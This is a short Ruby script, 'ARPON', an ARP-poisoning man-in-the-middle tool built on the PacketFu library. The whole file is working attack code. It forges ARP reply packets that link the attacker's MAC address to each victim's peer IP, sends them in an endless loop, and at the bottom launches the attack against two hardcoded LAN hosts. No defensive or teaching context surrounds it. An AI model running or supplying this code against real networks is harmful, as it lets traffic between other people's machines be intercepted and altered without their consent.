#!/usr/bin/env ruby

# ARPON - ARP Poisoning MITM Framework
#
# Copyright (c) 2015 - Albert Puigsech Galicia (albert@puigsech.com)
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL
# THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
# DEALINGS IN THE SOFTWARE.

require 'thread'
require 'ipaddress'
require 'packetfu'

class Arpon 
	def initialize(iface)
		@target_list = []
		@iface = PacketFu::Utils.whoami?(:iface => iface)
	end

	def mac_from_ip(ip)
		return PacketFu::Utils::arp(ip)
	end

	def set_arp_cache(target_ip, spoofed_ip, spoofed_mac)
		target_mac = mac_from_ip(target_ip)
		@target_list << {:target_ip => target_ip, :target_mac => target_mac, :spoofed_ip => spoofed_ip, :spoofed_mac => spoofed_mac}
	end

	def mitm_between(target_ip_1, target_ip_2)
		set_arp_cache(target_ip_1, target_ip_2, @iface[:eth_saddr])
		set_arp_cache(target_ip_2, target_ip_1, @iface[:eth_saddr])
	end

	def start
#   		@job = Thread.new do
   			loop do
   				@target_list.each do |t|
   					pkt = PacketFu::ARPPacket.new()
   					pkt.eth_saddr = t[:spoofed_mac]
   					pkt.eth_daddr = t[:target_mac]
   					pkt.arp_saddr_mac = t[:spoofed_mac]
   					pkt.arp_daddr_mac = t[:target_mac]
   					pkt.arp_saddr_ip =  t[:spoofed_ip]
   					pkt.arp_daddr_ip = t[:target_ip]
   					pkt.arp_opcode = 2
   					pkt.to_w
   				end
   				#sleep 5
   			end
		end
#	end
end


a = Arpon.new('eth0')
a.mitm_between('10.0.2.1', '10.0.2.4')
a.start